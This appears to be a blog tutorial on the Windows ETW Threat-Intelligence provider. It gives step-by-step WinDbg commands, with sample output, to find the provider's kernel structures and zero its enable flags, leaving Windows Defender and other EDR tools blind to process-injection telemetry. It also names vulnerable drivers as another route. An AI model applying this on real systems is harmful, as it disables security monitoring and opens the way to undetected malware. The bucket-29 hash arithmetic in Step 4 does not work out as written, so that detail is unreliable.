Windows Defender and most modern EDRs don't rely solely on signature scanning. They subscribe to a special kernel telemetry channel that fires every time a process allocates executable memory, maps a remote section, or reads another process's memory. That channel is the **Microsoft-Windows-Threat-Intelligence** ETW provider — and this post explains exactly what it is, how it works inside the kernel, and how to find and disable it with WinDbg.

---

## What Is ETW?

**Event Tracing for Windows (ETW)** is the kernel's built-in telemetry infrastructure. It has three roles:

- **Providers** — code that emits events. A provider registers a GUID and fires structured events at interesting points. The kernel itself has hundreds of providers (`nt`, `hal`, driver stacks, etc.).
- **Sessions** — the plumbing. A session is a named buffer that subscribes to one or more providers and collects their events.
- **Consumers** — processes that read from sessions. A consumer opens a session and receives a stream of structured events in real time.

The relationship: a provider fires an event → the kernel delivers it to every session subscribed to that provider → each consumer reading those sessions receives it.

![ETW architecture — provider, session, consumer](/assets/images/etw-architecture.svg)

Most ETW providers are user-mode optional — they only emit events if a session has subscribed. The kernel tracks this via an "enable info" structure per provider per session: when no session is listening, the provider's `IsEnabled` flag is `0` and its instrumentation points are skipped entirely (zero overhead).

## The Threat Intelligence Provider

`Microsoft-Windows-Threat-Intelligence` (GUID `{F4E1897C-BB5D-5668-F1D8-040F4D8DD344}`) is a **kernel-mode ETW provider** that emits events for operations that are commonly abused by malware:

| Event | Trigger |
|-------|---------|
| `KERNEL_THREATINT_TASK_ALLOCVM` | `NtAllocateVirtualMemory` with exec permissions |
| `KERNEL_THREATINT_TASK_MAPVIEW` | `NtMapViewOfSection` into another process |
| `KERNEL_THREATINT_TASK_READVM` | `NtReadVirtualMemory` on another process |
| `KERNEL_THREATINT_TASK_WRITEVM` | `NtWriteVirtualMemory` on another process |
| `KERNEL_THREATINT_TASK_PROTECTVM` | `NtProtectVirtualMemory` changing to exec |
| `KERNEL_THREATINT_TASK_QUEUEUSERAPC` | APC injection |
| `KERNEL_THREATINT_TASK_SETTHREADCONTEXT` | Thread context hijacking |

![ETW-TI event types — what each one watches and why](/assets/images/etw-ti-events.svg)

When Windows Defender's `DefenderApiLogger` session is subscribed to this provider, every process injection attempt — `VirtualAllocEx`, `WriteProcessMemory`, thread hijacking, shellcode mapping — fires a telemetry event that Defender inspects in real time. This is how Defender catches injection techniques that would bypass all usermode hooks.

The provider is also restricted to **PPL-Antimalware** consumers — ordinary processes cannot subscribe. This is why disabling it requires kernel access.

## The Kernel Data Structures

![ETW kernel structure navigation chain](/assets/images/etw-structure-chain.svg)

ETW state is rooted in a kernel structure called `_ETW_SILODRIVERSTATE`. A "silo" is Windows' container abstraction; the host silo holds the global ETW state. Inside it:

- `EtwpGuidHashTable` — a 64-bucket hash table of `_ETW_HASH_BUCKET`. Every registered ETW provider has a `_ETW_GUID_ENTRY` node stored in one of these buckets, keyed by its GUID.
- `EtwpLoggerContext` — a pointer array indexed by session ID. Each non-null slot points to a `_WMI_LOGGER_CONTEXT` that describes an active ETW session.

The `_ETW_GUID_ENTRY` structure is what holds everything about a specific provider:

```
_ETW_GUID_ENTRY
  +0x000  List             — linked list node (bucket chain)
  +0x010  RefCount
  +0x028  Guid             — the provider GUID (16 bytes)
  +0x060  ProviderEnableInfo  — _TRACE_ENABLE_INFO (summary: OR of all consumers)
  +0x080  EnableInfo[8]    — per-session enable info, one slot per subscribed session
  +0x188  SiloState        — pointer back to the owning _ETW_SILODRIVERSTATE
```

The `_TRACE_ENABLE_INFO` structure describes one consumer's subscription:

```
_TRACE_ENABLE_INFO
  +0x000  IsEnabled        — 1 if this session is currently subscribed
  +0x004  Level            — verbosity (0–5)
  +0x008  MatchAnyKeyword  — bitmask of subscribed event categories
  +0x01c  LoggerId         — which session slot (index into EtwpLoggerContext)
```

There are 8 `EnableInfo` slots per provider — ETW allows up to 8 simultaneous consumers of any single provider. `ProviderEnableInfo` at `+0x060` is the kernel's aggregate: it's `IsEnabled` if any slot is active.

## Step 1 — Find the ETW Silo Root

```
dp nt!EtwpDebuggerData L4
```

`EtwpDebuggerData` is a kernel symbol that exposes ETW internals to the kernel debugger. It's an array of pointers — the **4th pointer** (index 3, at `+0x18`) is the address of `_ETW_SILODRIVERSTATE` for the host silo.

`dp` = dump pointer-sized values. `L4` = read 4 of them.

**Example output:**
```
fffff803`4a2b0000  fffff803`4c8a1200
fffff803`4a2b0008  fffff803`4c8a1400
fffff803`4a2b0010  fffff803`4c8a1600
fffff803`4a2b0018  ffffb70a`79e3f000   ← _ETW_SILODRIVERSTATE (save this)
```

Save `ffffb70a79e3f000` — everything else derives from it.

---

## Step 2 — Dump the Silo State

```
dt nt!_ETW_SILODRIVERSTATE ffffb70a`79e3f000
```

This formats the silo state structure and shows all its fields. Two fields matter for the rest of this investigation:

- `+0x1c8 EtwpLoggerContext` — a pointer to an array of session pointers. Used in Step 9 to resolve session names from LoggerIds.
- `+0x1d0 EtwpGuidHashTable` — this is the hash table itself, embedded inline (not a pointer to it — the address shown is the table's base address in memory).

**Example output:**
```
nt!_ETW_SILODRIVERSTATE
   +0x000 Cookie           : 0x45545753
   ...
   +0x1c8 EtwpLoggerContext : 0xffffb70a`7a120000   ← save for Step 9
   +0x1d0 EtwpGuidHashTable : [64] _ETW_HASH_BUCKET
                              @ ffffb70a`79e3f1d0   ← HashTableBase (save this)
```

The address shown after `@` is `SiloBase + 0x1d0` — the hash table is embedded directly inside the silo structure, not allocated separately.

---

## Step 3 — Get the Bucket Size

```
?? sizeof(nt!_ETW_HASH_BUCKET)
```

This is a pure type query — no memory read. It tells you how large each hash bucket is so you can compute the correct offset to the TI provider's bucket in Step 4.

**Expected output:**
```
unsigned int64 0x38
```

`0x38` = 56 bytes per bucket.

---

## Step 4 — Jump to the TI Provider's Bucket

```
dt nt!_ETW_HASH_BUCKET ffffb70a`79e3f1d0+0x658
```

The TI provider GUID `{F4E1897C-BB5D-5668-F1D8-040F4D8DD344}` always hashes to bucket **29** (`0x1D`). The hash function XORs the GUID's first three DWORDs and a byte from Data4, then ANDs with `0x3F`:

```
(Data1 ^ Data2 ^ Data4[0] ^ Data4[4]) & 0x3F
= (0xF4E1897C ^ 0xBB5D5668 ^ 0xF1 ^ 0x04) & 0x3F
= 0x1D = 29
```

Offset to bucket 29: `29 × 0x38 = 0x658`.

The `_ETW_HASH_BUCKET` contains a `ListHead` — a `LIST_ENTRY` that is the head of all provider GUID entries hashed to this bucket. `Flink` is the first `_ETW_GUID_ENTRY` in the chain.

**Example output:**
```
nt!_ETW_HASH_BUCKET
   +0x000 ListHead :
      +0x000 Flink : 0xffffb70a`7b3c4200   ← first _ETW_GUID_ENTRY in bucket
      +0x008 Blink : 0xffffb70a`7b3c4200
   +0x010 Lock     : _EX_PUSH_LOCK
```

If `Flink == Blink == bucket head address`, the bucket is empty. If there are multiple entries, `Flink` chains through them.

---

## Step 5 — Find the TI Provider GUID in Memory

```
s -b ffffb70a`79e3f1d0 L?0x2000000 7c 89 e1 f4 5d bb 68 56 f1 d8 04 0f 4d 8d d3 44
```

This searches 32MB of kernel address space for the raw bytes of the TI provider GUID in little-endian layout. The `Guid` field in `_ETW_GUID_ENTRY` is at `+0x028` — hits will be 0x28 bytes into the structure.

Why search instead of just using the bucket Flink from Step 4? The bucket may contain multiple entries (hash collisions). The search confirms which hit is actually the TI provider, and you can validate by checking `SiloState` in the next step.

**Example output:**
```
ffffb70a`7b3c4228  7c 89 e1 f4 5d bb 68 56-f1 d8 04 0f 4d 8d d3 44   ← HitAddress
ffffb70a`7c1a0028  7c 89 e1 f4 5d bb 68 56-f1 d8 04 0f 4d 8d d3 44   ← ignore (wrong silo)
```

Two hits is normal — one per silo (host + server silo on some builds). Keep only the hit where `SiloState` matches `ffffb70a79e3f000` from Step 1.

---

## Step 6 — Dump the GUID Entry

```
dt nt!_ETW_GUID_ENTRY ffffb70a`7b3c4228-0x28
```

The `Guid` field is at `+0x028` — subtract `0x28` from the hit address to get the structure base. This gives you the `_ETW_GUID_ENTRY` for the TI provider.

Confirm two things: `Guid` matches the TI provider GUID, and `SiloState` at `+0x188` matches Step 1's silo address. If both match, this is your entry.

**Example output:**
```
nt!_ETW_GUID_ENTRY @ ffffb70a`7b3c4200
   +0x000 List             : _LIST_ENTRY
   +0x010 RefCount         : 0n3
   +0x028 Guid             : {f4e1897c-bb5d-5668-f1d8-040f4d8dd344}   ← confirmed ✓
   +0x060 ProviderEnableInfo : _TRACE_ENABLE_INFO
   +0x080 EnableInfo       : [8] _TRACE_ENABLE_INFO
   +0x188 SiloState        : 0xffffb70a`79e3f000   ← matches Step 1 ✓
```

**EntryBase = `ffffb70a7b3c4200`** — save this for Steps 7, 8, and 10.

---

## Step 7 — Check If Any Consumer Is Active

```
dt nt!_TRACE_ENABLE_INFO ffffb70a`7b3c4200+0x60
```

`+0x060` is `ProviderEnableInfo` — the aggregate enable state. If `IsEnabled` is `1` here, at least one session is subscribed. The `MatchAnyKeyword` of `0xFFFFFFFFFFFFFFFF` means all event categories are subscribed (Defender subscribes to everything). `LoggerId` here reflects the most recently enabled session.

**Example output:**
```
nt!_TRACE_ENABLE_INFO @ ffffb70a`7b3c4260
   +0x000 IsEnabled        : 0x1       ← provider is active
   +0x004 Level            : 0x4
   +0x008 MatchAnyKeyword  : 0xffffffffffffffff
   +0x01c LoggerId         : 6
```

---

## Step 8 — Walk All 8 Consumer Slots

```
dt nt!_TRACE_ENABLE_INFO ffffb70a`7b3c4200+0x80
dt nt!_TRACE_ENABLE_INFO ffffb70a`7b3c4200+0xa0
dt nt!_TRACE_ENABLE_INFO ffffb70a`7b3c4200+0xc0
... (continue +0x20 per slot, 8 total)
```

The `EnableInfo` array at `+0x080` holds one `_TRACE_ENABLE_INFO` per subscribed session, each 0x20 bytes. For each slot where `IsEnabled: 1`, note the `LoggerId` — that's the session slot you'll resolve in Step 9.

**Example — two active consumers:**
```
# Slot 0 (+0x80): IsEnabled=1, LoggerId=6   ← Defender's primary session
# Slot 1 (+0xa0): IsEnabled=1, LoggerId=7   ← another consumer
# Slots 2–7: IsEnabled=0, skip
```

Up to 8 sessions can simultaneously consume TI events. On a fully patched system with Windows Security Center enabled, you'll typically see 2–3 active slots.

---

## Step 9 — Identify the Consumer by Name

```
dq ffffb70a`7a120000+(6*8) L1
dt nt!_WMI_LOGGER_CONTEXT <result>
```

`EtwpLoggerContext` (from Step 2) is a pointer array indexed by `LoggerId`. Multiply the LoggerId by 8 (pointer size) to get the array offset. `dq` reads the pointer at that slot — that's the `_WMI_LOGGER_CONTEXT` for that session.

Dumping the logger context shows the session name in `LoggerName`. This is how you confirm that LoggerId 6 belongs to Defender.

**Example output:**
```
# Array lookup:
ffffb70a`7a120030  ffffb70a`7a884000   ← session pointer

# Session details:
nt!_WMI_LOGGER_CONTEXT @ ffffb70a`7a884000
   +0x000 LoggerName : _UNICODE_STRING "DefenderApiLogger"   ← confirmed
   +0x010 LoggerId   : 6
```

---

## Step 10 — Disable the Provider

To blind all consumers simultaneously, zero `ProviderEnableInfo.IsEnabled` at `+0x060`:

```
eb ffffb70a`7b3c4200+0x60 0
```

To disable only a specific consumer (e.g. Defender at slot 0):

```
eb ffffb70a`7b3c4200+0x80 0
```

Both write `0` to `IsEnabled`. Once cleared, the kernel's ETW instrumentation points see `IsEnabled=0` and skip event emission entirely — no call overhead, no events delivered, no visibility for Defender into memory operations.

**Verify:**
```
dt nt!_TRACE_ENABLE_INFO ffffb70a`7b3c4200+0x80
   +0x000 IsEnabled : 0x0   ← patched, Defender blind to TI events ✓
```

This requires a **full kernel debugging session** (named pipe or network). LiveKD is read-only and cannot perform this write.

---

## Key Points

- The TI provider is the primary mechanism by which Defender detects process injection techniques at the kernel level — bypassing it blinds Defender to `VirtualAllocEx`, `WriteProcessMemory`, thread context hijacking, and APC injection.
- There are up to 8 consumer slots per provider — check all 8 before assuming you've found every subscriber.
- The `ProviderEnableInfo` at `+0x060` is the kernel's fast check. Zeroing it short-circuits the entire dispatch path.
- GUID hash bucket assignment is deterministic — the TI provider always lands in bucket 29 on any Windows build, because its GUID never changes.
- Without a kernel write primitive (kernel debugger or vulnerable driver), this cannot be done from usermode.
